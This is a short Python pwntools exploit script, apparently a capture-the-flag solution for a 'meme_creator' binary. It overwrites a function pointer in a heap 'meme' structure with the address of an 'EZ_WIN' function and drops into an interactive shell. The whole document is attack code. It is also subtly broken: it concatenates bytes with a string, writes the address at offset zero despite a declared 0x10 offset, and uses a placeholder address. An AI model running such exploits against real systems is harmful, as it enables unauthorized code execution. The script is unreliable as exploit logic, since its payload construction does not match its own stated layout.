from pwn import *

# Adjust these values based on the actual environment
binary_path = './meme_creator'
remote_host = 'challenge.example.com'
remote_port = 1337
# Start the process or connect to the remote server
if args.REMOTE:
    p = remote(remote_host, remote_port)
else:
    p = process(binary_path)

# Find the offset for the function pointer in the meme structure
meme_size = 0x20  # Size of the meme content
func_ptr_offset = 0x10  # Offset of the function pointer in the meme structure

# Address of the EZ_WIN function
EZ_WIN_addr = 0x4014A0  # Replace with the actual address

# Create a new meme
p.sendlineafter('Choice: ', '1')
p.sendlineafter('Enter meme size: ', str(meme_size))
p.sendlineafter('Enter meme content: ', 'A' * meme_size)

# Edit the meme to overwrite the function pointer
p.sendlineafter('Choice: ', '2')
p.sendlineafter('Index: ', '0')
p.sendlineafter('Enter meme content: ', p64(EZ_WIN_addr) + 'A' * (meme_size - func_ptr_offset))

# Trigger the function pointer
p.sendlineafter('Choice: ', '3')
p.sendlineafter('Index: ', '0')

# Interact with the shell
p.interactive()

